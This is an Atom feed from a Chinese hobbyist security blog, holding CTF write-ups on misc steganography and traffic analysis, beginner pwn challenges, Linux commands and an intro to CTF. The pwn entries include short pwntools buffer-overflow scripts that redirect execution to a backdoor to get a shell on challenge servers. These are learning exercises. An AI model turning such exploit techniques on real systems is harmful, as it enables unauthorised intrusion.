<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>【W】</title>
  
  
  <link href="https://0410wzn.top/atom.xml" rel="self"/>
  
  <link href="https://0410wzn.top/"/>
  <updated>2021-11-26T17:33:13.643Z</updated>
  <id>https://0410wzn.top/</id>
  
  <author>
    <name>W</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BuuCTF杂项WP</title>
    <link href="https://0410wzn.top/2021/11/25/BuuCTF%E6%9D%82%E9%A1%B9WP/"/>
    <id>https://0410wzn.top/2021/11/25/BuuCTF%E6%9D%82%E9%A1%B9WP/</id>
    <published>2021-11-25T15:45:41.000Z</published>
    <updated>2021-11-26T17:33:13.643Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BuuCTF杂项WP"><a href="#BuuCTF杂项WP" class="headerlink" title="BuuCTF杂项WP"></a>BuuCTF杂项WP</h1><blockquote><p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/aaa.gif"></p><p>仔细看，会发现有几帧明显有猫腻，果断stegsolve，发现如下几帧：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-25 (8).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26.png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (1).png" style="zoom: 70%;"></div>答案显而易见对吧！<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>下载附件如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QR_code.png"></p><p>别怕，扫描一下：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(4).png" style="zoom:33%;"><p>很明显，flag似乎就在二维码里，但不能被直接扫描出来，这条路走不通，我们就换条路，从图像本身进行分析</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_001734.png" style="zoom:50%;"><p>果然有东西！binwalk提取，发现是一个文件夹，里面是一个需要密码的压缩包，旁边是一个文本文档，名叫”4number“，提示很明显了——四位数字爆破</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126004943690.png" alt="image-20211126004943690"></p><p>解压，拿到flag！</p><h3 id="你竟然赶我走！"><a href="#你竟然赶我走！" class="headerlink" title="你竟然赶我走！"></a>你竟然赶我走！</h3><p>hahaha，看看附件：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/biubiu.jpg" style="zoom:50%;"><p>没啥可说的，010或者hex一看有惊喜</p><h3 id="有N种方法解决"><a href="#有N种方法解决" class="headerlink" title="有N种方法解决"></a>有N种方法解决</h3><p>呐，这个附件打不开！！！—— 用010堪堪罢，惊喜出现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(5).png"></p><p>编码开始的地方似乎是让我们把这些base64编码转成图像，说干就干！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010508963.png" alt="image-20211126010508963"></p><p>扫一扫，得到答案！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010624861.png" alt="image-20211126010624861" style="zoom:33%;"><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>下载附件如图：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126011348020.png" alt="image-20211126011348020"></p><p>又时候，题干很重要，”看不到图？是不是屏幕太小了“——图片的长宽或许有问题！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012245141.png" alt="image-20211126012245141" style="zoom:33%;"><p>根据这个，我们通过010调整宽高，成功获得完整图片，你说flag在哪里呐😍</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012749979.png" alt="image-20211126012749979" style="zoom:50%;"><p><font color="red" size="5"><strong>干货:</strong></font></p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012915721.png" alt="image-20211126012915721" style="zoom:50%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126013036241.png" alt="image-20211126013036241" style="zoom:67%;"><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>emmm…都提示暴力破解了，那就乖乖暴力破解吧。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014055933.png" alt="image-20211126014055933" style="zoom: 50%;"><p>嘿嘿嘿🤭，爆破出来了！</p><p>解压文件，得到一段base64编码，转换即有flag！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014623349.png" alt="image-20211126014623349" style="zoom: 33%;"><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>图片里有啥信息？没啥好吧，010或者hex一看就ok</p><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><p>emmm…不是我不想写，而是没啥可写，球球你康康属性吧。。。</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>lsb嘛，stegsolve康一康，发现以下三幅图I里都有一些竖形：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (9).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (10).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (11).png" style="zoom: 70%;"></div><p>Data Extract</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(12).png" style="zoom:50%;"><p>提示了PNG，我们将其save bin为PNG图片，得到二维码，扫描即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/1.png"></p><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><font color="blue">Wireshark</font></h3><p>分析流量包，自然是使用wireshark了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224306932.png" alt="image-20211126224306932" style="zoom: 80%;"><p>emmm…该看啥啊？</p><p>经过查询之后，了解到了题目中“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)”给了不止一个提示——**<font color="red">登录用到的请求方式是POST或GET，一般网站采取POST方式（出于安全考虑），故先用POST为条件进行筛选</font>**筛选语句如下：</p><blockquote><p>http.request.method==POST</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224745090.png" alt="image-20211126224745090"></p><p>只有一条！追踪其TCP流即可找到password，即flag</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224917569.png" alt="image-20211126224917569"></p><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>告诉4位数字了，爆破就完了呗，拜拜</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_190251.png"></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a><font color="blue">zip伪加密</font></h3><p>不说别的，直接上<font color="red" size="5"><strong>干货</strong></font>：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011559649.png" alt="image-20211127011559649"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011629241.png" alt="image-20211127011629241"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011701328.png" alt="image-20211127011701328"></p><p>依据上述知识点，我们打开010</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127012016868.png" alt="image-20211127012016868"></p><p>发现前后各有1个09，伪加密木大错，都改为0000即可,之后就会发现压缩包可以加压力，里面的文件里就是flag</p><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><p>真就是：“二维码，谁用谁知道”，拜拜~</p><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>提到流量分析，自然又是wireshark！</p><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>这个题啊，镜子里面啊，想隐写啊。<del>（010、binwalk找不出啥来才想的🐶,）</del></p><p>LSB!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-27.png" alt="2021-11-27"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://0410wzn.top/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界PWN新手区WP（长期更新）</title>
    <link href="https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2021-11-17T11:02:54.000Z</published>
    <updated>2021-11-19T03:12:00.167Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界PWN新手区WP（长期更新）"><a href="#攻防世界PWN新手区WP（长期更新）" class="headerlink" title="攻防世界PWN新手区WP（长期更新）"></a>攻防世界PWN新手区WP（长期更新）</h1><blockquote><p>题目地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0</a></p></blockquote><h2 id="一、get-shell"><a href="#一、get-shell" class="headerlink" title="一、get_shell"></a>一、get_shell</h2><p>  获取靶场,nc登上查看即可，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117192610443.png" alt="image-20211117192610443" style="zoom:33%;"><h2 id="二、Hello-pwn"><a href="#二、Hello-pwn" class="headerlink" title="二、Hello pwn!"></a>二、Hello pwn!</h2><p>  首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117193524850.png" alt="image-20211117193524850" style="zoom: 75%;"><p>  嗯，只开了NX，好耶！</p><p>  接下来用64位的ida打开分析逻辑，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117194019299.png" alt="image-20211117194019299" style="zoom:50%;"><p>  看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。</p><p>  明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;地址&#x27;</span>， 端口)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * ( <span class="number">0x60106C</span> - <span class="number">0x60106C</span> ) + p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;bof\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行，皆大欢喜。</p><p>  <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117195744632.png" alt="image-20211117195744632"></p><h2 id="三、level0"><a href="#三、level0" class="headerlink" title="三、level0"></a>三、level0</h2><p>  先用checksec看一下文件位数和保护措施，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/level0_01.png" alt="level0_01" style="zoom:75%;"><p>  依旧是只有NX开了，题目应该比较简单</p><p>  将文件拖入ida，先分析与运行逻辑，再shift + f12, 查看有没有后门函数，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119104858061.png" alt="image-20211119104858061" style="zoom: 90%;"> <p>  发现上图输入出存在栈溢出可能（buf为80字节，要输入200字节），然后去找后门函数</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119105037317.png" alt="image-20211119105037317" style="zoom:75%;"><p>  发现有“/bin/sh”，同时有system，点进去发现后门在名为“callsystem”的函数里，因此我们的目标很明确了，同通过栈溢出将buf覆盖，并将epb转移到函数上，使程序运行后门函数，编写脚本即可，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context,arch = <span class="string">&quot;amd64&quot;</span>// 切换环境</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;地址&#x27;</span>, 端口)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span>// 函数在栈中的位置</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * ( <span class="number">0x80</span> + <span class="number">0x08</span> ) + p64( callsystem )// 使程序最终运行后门函数</span><br><span class="line"></span><br><span class="line">io = sendline( payload )</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行脚本，结果如下，成功控制服务器，寻找、查看flag即可。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119110053521.png" alt="image-20211119110053521" style="zoom:50%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="人生苦短，我学Pwn" scheme="https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwn 入门札记</title>
    <link href="https://0410wzn.top/2021/10/22/Pwn-%E5%85%A5%E9%97%A8%E6%9C%AD%E8%AE%B0/"/>
    <id>https://0410wzn.top/2021/10/22/Pwn-%E5%85%A5%E9%97%A8%E6%9C%AD%E8%AE%B0/</id>
    <published>2021-10-22T15:20:31.000Z</published>
    <updated>2021-11-19T02:31:56.461Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>linux学习札记</title>
    <link href="https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    <id>https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/</id>
    <published>2021-10-20T15:35:51.000Z</published>
    <updated>2021-10-23T16:17:49.911Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>  本学习札记立足于笔者入门linux系统命令学习时，通过OverTheWise的战争游戏，经查询、做题实践后写出，不足之处还请多多见谅。</p><h4 id="1、pwd"><a href="#1、pwd" class="headerlink" title="1、pwd"></a>1、pwd</h4><p>  pwd命令常用于得知操作者目前所在的目录名称。</p><h4 id="2、ls"><a href="#2、ls" class="headerlink" title="2、ls"></a>2、ls</h4><p>  ls命令用于显示目前操作者所在目录之下的内容</p><blockquote><ul><li>-a 显示所有文件及目录 (<font size="3" color="red"><strong>.</strong> 开头的隐藏文件也会列出</font>)</li><li>-l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出</li><li>-r 将文件以相反次序显示(原定依英文字母次序)</li><li>-t 将文件依建立时间之先后次序列出</li><li>-A 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录)</li><li>-F 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“</li><li>-R 若目录下有文件，则以下之文件亦皆依序列出</li></ul></blockquote><h4 id="3、-cat"><a href="#3、-cat" class="headerlink" title="3、 cat"></a>3、 cat</h4><p>  cat命令用于连接文件并打印到标准输出设备上</p><blockquote><ul><li><p>-n 或 –number**：由 1 开始对所有输出的行数编号。</p></li><li><p>-b 或 –number-nonblank**：和 -n 相似，只不过对于空白行不编号</p></li><li><p>-s 或 –squeeze-blank**：当遇到有连续两行以上的空白行，就代换为一行的空白行</p></li><li><p>-v 或 –show-nonprinting**：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外</p></li><li><p>-E 或 –show-ends : 在每行结束处显示 $</p></li><li><p>-T 或 –show-tabs: 将 TAB 字符显示为 ^I</p></li><li><p>-A, –show-all：等价于 -vET</p></li><li><p>-e：**等价于”-vE”选项</p></li><li><p>-t：**等价于”-vT”选项</p></li></ul></blockquote><p>例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/07.png" style="zoom:67%;"></p><h4 id="4、-file"><a href="#4、-file" class="headerlink" title="4、 file"></a>4、 file</h4><p>  file命令通常用来查看辨别文件命名，与呆板的windows不同，linux不是通过文件后缀名去判断文件为何，而是通过判断文件的<font size="3" color="red">文件头</font>来判断的，因此linux可以准确地判断文件为何种类型。</p><blockquote><ul><li>-b 　列出辨识结果时，不显示文件名称</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形</li><li>-f      &lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称</li><li>-L 　直接显示符号连接所指向的文件的类别</li><li>-m    &lt;魔法数字文件&gt; 　指定魔法数字文件</li><li>-v 　显示版本信息</li><li>-z 　尝试去解读压缩文件的内容</li><li>[文件或目录…]     要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件</li></ul></blockquote><p>  例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/12.png" style="zoom:67%;"></p><h4 id="5、-find"><a href="#5、-find" class="headerlink" title="5、 find"></a>5、 find</h4><p>  find一般用来查找指定目录下的文件，<font size="3" color="red">如果未加参数，则会将查到的子目录与文件全部显示</font>。</p><blockquote><p>由于参数过多，下面只列出较为常用的部分：</p><ul><li><p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</p></li><li><p>-amin n : 在过去 n 分钟内被读取过</p></li><li><p>-anewer file : 比文件 file 更晚被读取过的文件</p></li><li><p>-atime n : 在过去n天内被读取过的文件</p></li><li><p>-cmin n : 在过去 n 分钟内被修改过</p></li><li><p>-cnewer file :比文件 file 更新的文件</p></li><li><p>-ctime n : 在过去n天内被修改过的文件</p></li><li><p>-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name</p></li><li><p>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</p></li><li><p>-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</p></li><li><p>-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。</p></li><li><p>-type c : 文件类型是 c 的文件。</p></li><li><p>d: 目录</p></li><li><p>c: 字型装置文件</p></li><li><p>b: 区块装置文件</p></li><li><p>p: 具名贮列</p></li><li><p>f: 一般文件</p></li><li><p>l: 符号连结</p></li><li><p>s: socket</p></li><li><p>-pid n : process id 是 n 的文件</p></li></ul></blockquote><p>  例：（这里与下一命令size一起列出）<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/16.png" style="zoom: 67%;"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Linux命令入门" scheme="https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界MISC新手题部分WP(更新ing)</title>
    <link href="https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/"/>
    <id>https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/</id>
    <published>2021-10-10T00:34:06.000Z</published>
    <updated>2021-10-29T08:51:16.920Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界Misc新手题WP"><a href="#攻防世界Misc新手题WP" class="headerlink" title="攻防世界Misc新手题WP"></a>攻防世界Misc新手题WP</h1><blockquote><p>地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0</a></p></blockquote><h2 id="一、PDF"><a href="#一、PDF" class="headerlink" title="一、PDF"></a>一、PDF</h2><blockquote><p>菜猫给了菜狗一张图，说图下面什么都没有</p></blockquote><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/01.jpg" alt="01" style="zoom: 25%;"><p>  因为题目里明显提示了“下面”，我们自然便能想到文件“下面”藏着什么，其一可能在图片下面藏有信息，其二可能藏有其它文件，于是开始逐步尝试。</p><p>  首先，我们查看其属性，发现并没有什么隐藏信息，于是开始研究图片下面。</p><p>  通过办公软件，我们将pdf文件转换成word文档，以此来从物理上观察图片下的信息。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/02.jpg" alt="02.jpg" style="zoom: 50%;"><p>   当我们打开word文档，我们惊奇的发现，flag已经明显出现在眼前了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/03.jpg" alt="03.jpg" style="zoom:25%;"><p>  复制粘贴结束。</p><h2 id="二、give-you-flag"><a href="#二、give-you-flag" class="headerlink" title="二、give_you_flag"></a>二、give_you_flag</h2><blockquote><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包</p></blockquote><p>  下载附件后，看到如下动图。</p><p>​                                                            <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/4b0799f9a4d649f09a882b6b1130bb70%20(1).gif">  </p><p>  题目中提到“文件中的”彩蛋“，所以文件中肯定有一些信息，而一张动图，是由多张静止图片组合成的，由  此想到，运用stegsolve一帧一帧的看，发现一面的一帧藏有信息—一张二维码！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/image-20211012164312725.png"></p><p>  我们使用分帧工具将图片提取出来，得到带有二维码的图片</p><p>​                                                                   <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/IMG00049.bmp"></p><p>  很明显，这个二维码缺少定位角，找到定位角用图片编辑工具补上即可。补完后，扫码，flag出现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入门" scheme="https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF简介</title>
    <link href="https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/"/>
    <id>https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/</id>
    <published>2021-10-09T13:57:31.000Z</published>
    <updated>2021-10-29T08:50:20.255Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CTF简介"><a href="#一、CTF简介" class="headerlink" title="一、CTF简介"></a>一、CTF简介</h1><p>  Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:<a href="https://baike.baidu.com/item/CTF/9548546?fr=aladdin">CTF</a>词条。</p><p><a href="E:\photo\CTF">CTF</a></p><h1 id="二、CTF的题目类型"><a href="#二、CTF的题目类型" class="headerlink" title="二、CTF的题目类型"></a>二、CTF的题目类型</h1><p>​    CTF的题目类型大致包括以下五种： <a href="#Web">Web</a>，<a href="#Pwn">Pwn</a>，<a href="#Misc">Misc</a>， <a href="#Reverse">Reverse</a>，<a href="#Crypto">Crypto</a></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>​    Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件.</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>​    Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><pre><code>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</code></pre><p>   常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>​    Reverse题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>​    Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h1 id="三、CTF的比赛形式"><a href="#三、CTF的比赛形式" class="headerlink" title="三、CTF的比赛形式"></a>三、CTF的比赛形式</h1><p>  CTF的比赛形式主要包括以下几种：<a href="#%E7%90%86%E8%AE%BA%E7%B1%BB">理论类</a>，<a href="#Jeopardy-%E8%A7%A3%E9%A2%98">Jeopardy-解题</a>)，<a href="#AwD-%E6%94%BB%E9%98%B2">AwD-攻防</a>，<a href="#RHG-%E8%87%AA%E5%8A%A8%E5%8C%96">RHG-自动化</a>，<a 